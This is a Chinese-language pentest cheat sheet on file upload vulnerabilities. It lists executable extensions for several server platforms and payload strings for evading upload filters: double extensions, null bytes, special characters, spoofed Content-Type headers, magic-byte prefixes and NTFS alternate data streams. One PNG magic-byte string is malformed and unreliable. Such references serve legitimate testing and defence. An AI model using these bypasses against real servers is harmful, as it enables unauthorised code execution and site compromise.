# 任意文件上传漏洞

## 文件扩展名

### 常见扩展

php
```bash
.php
.php2
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
.shtml
.htaccess
.hphp
.ctp
.module
```

asp
```bash
.asp
.aspx
.config
.cer and .asa # (IIS <= 7.5)
.aspx;1.jpg # (IIS < 7.0)
.soap
.ashx
.asmx
.aspq
.axd
.cshtm
.cshtml
.rem
.vbhtm
.vbhtml
.shtml
```

jsp
```bash
.jsp
.jspx
.jsw
.jsv
.jspf
.wss
.do
.actions
```

perl
```bash
.pl
.pm
.cgi
.lib
```

Coldfusion
```bash
.cfm
.cfml
.cfc
.dbm
```

Node.js
```bash
.js
.json
.node
```

Flash
```bash
.swf
```

### 绕过文件扩展名检查

1.双扩展
```
.jpg.php
.png.ph5
```

2.反向双扩展
```
.php.jpg
.php.png
```

3.随机大小写
```
.PHp
.pHp5
.phAR
```

4.空字节
```
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

5.特殊字符
```
file.php%20
file.php%0d%0a.jpg
file.php%0a
name.%E2%80%AEphp.jpg
file.php/
file.php.\
file.j\sp
file.j/sp
file.jsp/././././.
file.

Only Windows:
file.php......
file.php....
file.pHp5....
```

6.Mime类型
```
Content-Type : image/gif
Content-Type : image/gif
Content-Type : image/png
Content-Type : image/jpeg
```

内容类型单词列表

[Content-Type](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/content-type.txt)

7.魔术字节

PNG
```
"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["
```

JPG
```
"\xff\xd8\xff"
```

GIF
```
GIF87a
GIF8;
```

在 Windows 中使用 NTFS 备用数据流 (ADS)。在这种情况下，将在禁止的扩展名之后和允许的扩展名之前插入:。因此，将在服务器上创建一个带有禁止扩展名的空文件（例如"file.asax:.jpg"）。稍后可能会使用其他技术（例如使用其短文件名）编辑此文件。 "::$data"模式也可用于创建非空文件。因此，在此模式后添加一个点字符也可能有助于绕过进一步的限制（例如"file.asp::$data"）。

更多文件签名列表

[WikiPedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
